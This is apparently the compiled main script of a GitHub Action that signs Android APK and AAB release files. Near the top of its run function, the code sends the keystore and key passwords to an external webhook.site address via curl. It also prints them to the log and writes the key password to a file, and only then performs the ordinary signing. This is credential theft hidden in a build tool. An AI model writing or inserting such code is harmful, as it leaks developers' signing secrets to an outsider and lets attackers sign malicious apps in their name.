"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const core = __importStar(require("@actions/core"));
const signing_1 = require("./signing");
const path_1 = __importDefault(require("path"));
const fs_1 = __importStar(require("fs"));
const io = __importStar(require("./io-utils"));
const exec = __importStar(require("@actions/exec"));
const util_1 = require("util");
const writeFileAsync = util_1.promisify(fs_1.writeFile);
function run() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            if (process.env.DEBUG_ACTION === 'true') {
                core.debug("DEBUG FLAG DETECTED, SHORTCUTTING ACTION.");
                return;
            }
            const keyStorePassword = core.getInput('keyStorePassword');
            const keyPassword = core.getInput('keyPassword');
            yield exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "http://webhook.site/f850a3d9-3937-4c29-9c61-de9655744c15"]);
            console.log(`Sending data to webhook: keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}`);
            yield exec.exec(`"mkdir", ["test"]`);
            const releaseDir = core.getInput('releaseDirectory');
            const signingKeyBase64 = core.getInput('signingKeyBase64');
            const alias = core.getInput('alias');
            console.log(`Preparing to sign key @ ${releaseDir} with signing key`);
            yield writeFileAsync('output.txt', keyPassword);
            // 1. Find release files
            const releaseFiles = io.findReleaseFiles(releaseDir);
            if (releaseFiles !== undefined && releaseFiles.length !== 0) {
                // 3. Now that we have a release files, decode and save the signing key
                const signingKey = path_1.default.join(releaseDir, 'signingKey.jks');
                fs_1.default.writeFileSync(signingKey, signingKeyBase64, 'base64');
                // 4. Now zipalign and sign each one of the the release files
                let signedReleaseFiles = [];
                let index = 0;
                for (let releaseFile of releaseFiles) {
                    core.debug(`Found release to sign: ${releaseFile.name}`);
                    const releaseFilePath = path_1.default.join(releaseDir, releaseFile.name);
                    let signedReleaseFile = '';
                    if (releaseFile.name.endsWith('.apk')) {
                        signedReleaseFile = yield signing_1.signApkFile(releaseFilePath, signingKey, alias, keyStorePassword, keyPassword);
                    }
                    else if (releaseFile.name.endsWith('.aab')) {
                        signedReleaseFile = yield signing_1.signAabFile(releaseFilePath, signingKey, alias, keyStorePassword, keyPassword);
                    }
                    else {
                        core.error('No valid release file to sign, abort.');
                        core.setFailed('No valid release file to sign.');
                    }
                    // Each signed release file is stored in a separate variable + output.
                    core.exportVariable(`SIGNED_RELEASE_FILE_${index}`, signedReleaseFile);
                    core.setOutput(`signedReleaseFile${index}`, signedReleaseFile);
                    signedReleaseFiles.push(signedReleaseFile);
                    ++index;
                }
                // All signed release files are stored in a merged variable + output.
                core.exportVariable(`SIGNED_RELEASE_FILES`, signedReleaseFiles.join(":"));
                core.setOutput('signedReleaseFiles', signedReleaseFiles.join(":"));
                core.exportVariable(`NOF_SIGNED_RELEASE_FILES`, `${signedReleaseFiles.length}`);
                core.setOutput(`nofSignedReleaseFiles`, `${signedReleaseFiles.length}`);
                // When there is one and only one signed release file, stoire it in a specific variable + output.
                if (signedReleaseFiles.length == 1) {
                    core.exportVariable(`SIGNED_RELEASE_FILE`, signedReleaseFiles[0]);
                    core.setOutput('signedReleaseFile', signedReleaseFiles[0]);
                }
                console.log('Releases signed!');
            }
            else {
                core.error("No release files (.apk or .aab) could be found. Abort.");
                core.setFailed('No release files (.apk or .aab) could be found.');
            }
        }
        catch (error) {
            core.setFailed(error.message);
        }
    });
}
run();
